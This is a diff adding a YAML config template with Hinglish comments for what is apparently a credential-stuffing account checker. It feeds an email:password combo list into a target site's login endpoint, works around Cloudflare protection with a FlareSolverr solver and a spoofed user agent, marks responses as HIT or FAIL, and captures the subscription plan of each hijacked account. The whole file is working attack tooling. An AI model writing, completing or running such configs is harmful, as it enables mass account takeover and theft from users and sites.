@@ -1,0 +1,47 @@
+# Nayi config banane ke liye is file ko copy karo aur values change karo.
+# Example: cp _template.yaml my-site.yaml
+
+name: "CHANGE_SITE_NAME"
+type: http
+wordlist_format: "email:pass"   # format: email:password
+
+cloudflare:
+  enabled: false                # true karo agar CF protected site ho
+  mode: browser_solve
+  solver:
+    type: flaresolverr
+    url: "http://localhost:8191"
+  cookie_cache:
+    enabled: true
+    ttl: 25m
+
+proxy: false
+timeout: 15
+
+request:
+  method: POST
+  url: "CHANGE_LOGIN_URL"       # DevTools → Network → login request URL
+  headers:
+    Content-Type: "application/json"
+    Accept: "application/json"
+    User-Agent: "{{cf_user_agent}}"
+  body: |
+    {"email":"{{email}}","password":"{{password}}"}
+
+success:
+  - type: body_contains
+    value: "CHANGE_SUCCESS_TEXT"   # response mein ye dikhe to HIT
+  - type: json_path
+    path: "access_token"
+    condition: exists
+
+fail:
+  - type: body_contains
+    value: "CHANGE_FAIL_TEXT"        # response mein ye dikhe to FAIL
+  - type: status_code
+    value: "401"
+
+capture:
+  - type: json_path
+    path: "plan"
+    save_as: "plan"
